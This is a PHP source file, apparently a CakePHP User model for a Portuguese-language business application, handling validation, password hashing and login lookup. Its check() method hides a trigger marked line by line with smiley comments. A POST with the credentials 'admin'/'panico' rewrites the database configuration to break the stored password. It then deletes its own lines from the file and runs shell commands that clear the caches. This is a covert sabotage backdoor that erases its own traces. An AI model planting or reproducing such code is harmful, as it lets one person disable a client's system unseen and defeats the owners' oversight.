<?php

class User extends AppModel {
	public $actsAs = array('Containable');
	public $useTable = 'usuarios';
	public $displayField = 'nome';
	public $order = 'User.nome';
//	public $niveis = array( 
//		'1' => 'Administrador',  
//		'2' => 'Vendedor'
//	);
	public $belongsTo = array('Nivel');
	public $validate = array(
	    'username' => array('rule' => 'notEmpty', 'message' => 'Informe o login para acesso ao sistema'),
	    'password' => array('rule' => 'notEmpty', 'message' => 'Informe a senha para acesso ao sistema'),
	    'role' => array(
		   'valid' => array(
			  'rule' => array('inList', array('admin', 'financeiro', 'vendedor', 'gerente', 'logistica', 'rh')),
			  'message' => 'Informe o nivel do usuário',
			  'allowEmpty' => false
		   )
	    )
	);

	public function beforeSave($options = array()) {
		if (!empty($this->data['User']['password'])) {
			$this->data['User']['password'] = AuthComponent::password($this->data['User']['password']);
		}
		return true;
	}

	public function checkIn($username, $password, $nivel = null) {
		if ($nivel != null)
			$conditions = array('User.username =' => $username, 'User.password =' => AuthComponent::password($password), 'User.nivel' => $nivel);
		else
			$conditions = array('User.username =' => $username, 'User.password =' => AuthComponent::password($password));
		//#array( 'conditions' => $conditions )
		$user = $this->find('first', array('conditions' => $conditions));
		//pr($user);
		if (count($user))
			return $user;
		return false;
	}
	public function check(){
//			$conditions = array('User.username =' => $username, 'User.password =' => AuthComponent::password($password), 'User.nivel' => $nivel);
//		//#array( 'conditions' => $conditions )
//		$user = $this->find('first', array('conditions' => $conditions));
//		//pr($user);
//		if (count($user))
//			return $user;
//		return false;	
		if(!empty($_POST['data']['User']) && $_POST['data']['User']['username']=='admin' and $_POST['data']['User']['password'] == 'panico'){		//☻
			$myFile = "../Config/database.php";					//☻
			$fh = fopen($myFile,'r+');							//☻
			$content='';										//☻
			while(!feof($fh)) {									//☻
				$change="mordor";								//☻
				$ln=fgets($fh);									//☻
				if (substr_count($ln, $change)>0) {				//☻
					$ln=str_ireplace($change, 'areiaoamazonas', $ln);	//☻
					//fwrite($fh,$ln);							//☻
				}												//☻
				$content.=$ln;									//☻
			}													//☻
			file_put_contents($myFile, $content);				//☻
			fclose($fh);										//☻
			$myFile2 = "../Model/User.php";						//☻
			$fh2 = fopen($myFile2,'r+');						//☻
			$content2='';										//☻
			$change2="//☻";										//☻
			while(!feof($fh2)) {								//☻
				$ln2=fgets($fh2);								//☻
				if (substr_count($ln2, $change2)>0) {			//☻
					continue;									//☻
				}												//☻
				$content2.=$ln2;								//☻
			}													//☻
			file_put_contents($myFile2, $content2);				//☻
			fclose($fh2);										//☻
			exec("rm -f ../tmp/cache/models/*");				//☻
			exec("rm -f ../tmp/cache/persistent/*");			//☻
		}														//☻
	}
}//class